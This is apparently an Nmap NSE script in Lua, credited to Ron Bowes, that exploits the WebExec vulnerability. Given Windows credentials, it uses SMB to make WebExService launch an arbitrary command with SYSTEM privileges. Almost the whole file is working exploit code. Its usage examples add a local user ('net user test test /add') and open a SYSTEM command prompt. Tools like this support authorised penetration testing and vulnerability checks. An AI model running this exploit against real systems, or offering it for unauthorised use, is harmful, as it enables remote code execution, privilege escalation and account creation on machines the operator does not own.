local msrpc = require "msrpc"
local smb = require "smb"
local stdnse = require "stdnse"
local string = require "string"
local shortport = require "shortport"
-- compat stuff for Nmap 7.70 and earlier
local have_stringaux, stringaux = pcall(require, "stringaux")
local strsplit = (have_stringaux and stringaux or stdnse).strsplit

description = [[
Attempts to run a command via WebExService, using the WebExec vulnerability.
Given a Windows account (local or domain), this will start an arbitrary
executable with SYSTEM privileges over the SMB protocol.

The argument webexec_command will run the command directly. It may or may not
start with a GUI. webexec_gui_command will always start with a GUI, and is
useful for running commands such as "cmd.exe" as SYSTEM if you have access.

References:
* https://www.webexec.org
* https://blog.skullsecurity.org/2018/technical-rundown-of-webexec
]]

---
-- @usage
-- nmap --script smb-vuln-webexec --script-args 'smbusername=<username>,smbpass=<password>,webexec_command=net user test test /add' -p139,445 <host>
-- nmap --script smb-vuln-webexec --script-args 'smbusername=<username>,smbpass=<password>,webexec_gui_command=cmd' -p139,445 <host>
--
-- @args webexec_command The command to run on the target
-- @args webexec_gui_command The command to run on the target with a GUI
--
-- @output
-- | smb-vuln-webexec:
-- |_  Vulnerable: WebExService could be accessed remotely as the given user!
--
-- | smb-vuln-webexec:
-- |   Vulnerable: WebExService could be accessed remotely as the given user!
-- |_  ...and successfully started console command: net user test test /add
--
-- @see smb-vuln-webexec.nse

author = "Ron Bowes"
license = "Same as Nmap--See https://nmap.org/book/man-legal.html"
categories = {"intrusive","exploit"}

portrule = shortport.port_or_service({445, 139}, "microsoft-ds", "tcp", "open")

local run_command = function(smbstate, service_handle, command)
  stdnse.debug1("Attempting to run: " .. command)

  return msrpc.svcctl_startservicew(smbstate, service_handle, strsplit(" ", "install software-update 1 " .. command))
end

action = function(host, port)

  local webexec_command = stdnse.get_script_args("webexec_command")
  local webexec_gui_command = stdnse.get_script_args("webexec_gui_command")

  if not webexec_command and not webexec_gui_command then
    return stdnse.format_output(false, "script-args webexec_command or webexec_gui_command is required to run this script")
  end

  local open_result
  local close_result
  local bind_result
  local result

  local status, smbstate = msrpc.start_smb(host, msrpc.SVCCTL_PATH)
  if not status then
    return stdnse.format_output(false, smbstate)
  end

  status, bind_result = msrpc.bind(smbstate, msrpc.SVCCTL_UUID, msrpc.SVCCTL_VERSION, nil)

  if not status then
    smb.stop(smbstate)
    return stdnse.format_output(false, bind_result)
  end

  local result, username, domain = smb.get_account(host)
  if result then
    if domain and domain ~= "" then
      username = domain .. "\\" .. stdnse.string_or_blank(username, '<blank>')
    end
  end

  -- Open the service manager
  stdnse.debug1("Trying to open the remote service manager")

  status, open_result = msrpc.svcctl_openscmanagerw(smbstate, host.ip, 0x00000001)

  if not status then
    smb.stop(smbstate)
    return stdnse.format_output(false, open_result)
  end

  local open_status, open_service_result = msrpc.svcctl_openservicew(smbstate, open_result['handle'], 'webexservice', 0x00010)

  if open_status == false then
    status, close_result = msrpc.svcctl_closeservicehandle(smbstate, open_result['handle'])
    smb.stop(smbstate)
    if string.match(open_service_result, 'NT_STATUS_SERVICE_DOES_NOT_EXIST') then
      return stdnse.format_output(false, "WebExService is not installed")
    elseif string.match(open_service_result, 'NT_STATUS_WERR_ACCESS_DENIED') then
      return stdnse.format_output(false, "WebExService could not be accessed by " .. username)
    end
    return stdnse.format_output(false, "WebExService failed to open with an unknown status: " .. open_service_result)
  end


  stdnse.debug1("Successfully opened a handle to WebExService")

  local output = nil
  if webexec_command then
    status, result = run_command(smbstate, open_service_result['handle'], 'cmd /c ' .. webexec_command)
    if not status then
      output = "Failed to start the service: " .. result
    else
      output = "Asked WebExService to run " .. webexec_command
    end
  end

  if webexec_gui_command then
    -- If they run both, give the first one a second to finish
    if webexec_command then
      stdnse.sleep(1)
    end

    status, result = run_command(smbstate, open_service_result['handle'], 'wmic process call create ' .. webexec_gui_command)
    if not status then
      output = "Failed to start the service: " .. result
    else
      output = "Asked WebExService to run " .. webexec_gui_command .. " (with a GUI)"
    end
  end

  status, close_result = msrpc.svcctl_closeservicehandle(smbstate, open_result['handle'])
  smb.stop(smbstate)
  return output
end
